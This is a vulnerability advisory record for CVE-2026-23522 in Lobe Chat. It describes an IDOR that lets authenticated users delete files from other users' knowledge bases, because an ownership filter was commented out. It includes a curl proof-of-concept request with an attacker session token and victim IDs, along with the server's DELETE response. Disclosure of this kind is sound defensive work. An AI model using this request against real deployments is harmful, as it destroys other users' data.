advisory_id: GHSA-j7xp-4mg9-x28r
datasource_id: github_osv_importer_v2/GHSA-j7xp-4mg9-x28r
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-j7xp-4mg9-x28r/GHSA-j7xp-4mg9-x28r.json
aliases:
  - CVE-2026-23522
summary: |
  Lobe Chat has IDOR in Knowledge Base File Removal that Allows Cross User File Deletion
  ### Summary

  `knowledgeBase.removeFilesFromKnowledgeBase` tRPC ep allows authenticated users to delete files from any knowledge base without verifying ownership.

  ### Details

  `userId` filter in the database query is commented out, so it's enabling attackers to delete other users' KB files if they know the knowledge base ID and file ID.

  ### PoC

  ```
  ATTACKER_TOKEN="xx"

  VICTIM_KB="kb_tuLBfskdDN1r"
  VICTIM_FILE="file_v5wCNLqSaoPp"

  curl -X POST "https://localhost/trpc/lambda/knowledgeBase.removeFilesFromKnowledgeBase?batch=1" -H "Content-Type: application/json" -b "__Secure-better-auth.session_token=$ATTACKER_TOKEN" -d '{"0":{"json":{"knowledgeBaseId":"'"$VICTIM_KB"'","ids":["'"$VICTIM_FILE"'"]}}}'
  ```

  Response:

  `{"result":{"data":{"json":{"command":"DELETE","rowCount":1,"oid":null,"rows":[],"fields":[]}}}}`

  ### Impact

  An attacker can delete files from any user's KB. RAG/AI functionality broken when files removed. It could cause loss of important documents, proprietary data etc.

  While the vuln is confirmed, practical exploitation requires knowing target's KB ID and target's file ID. These IDs are random and not easily enumerable. However, IDs may leak through shared links, logs, referrer headers and so on. Missing authorization check is a critical security flaw regardless.
impacted_packages:
  - purl: pkg:npm/%40lobehub/chat
    affected_versions: vers:npm/<=1.143.2
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '3.7'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-j7xp-4mg9-x28r/GHSA-j7xp-4mg9-x28r.json
  - score: LOW
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-284
references:
  - url: https://github.com/lobehub/lobe-chat
    reference_type:
    reference_id:
  - url: https://github.com/lobehub/lobe-chat/commit/2c1762b85acb84467ed5e799afe1499cd2f912e6
    reference_type:
    reference_id:
  - url: https://github.com/lobehub/lobe-chat/security/advisories/GHSA-j7xp-4mg9-x28r
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-23522
    reference_type:
    reference_id:
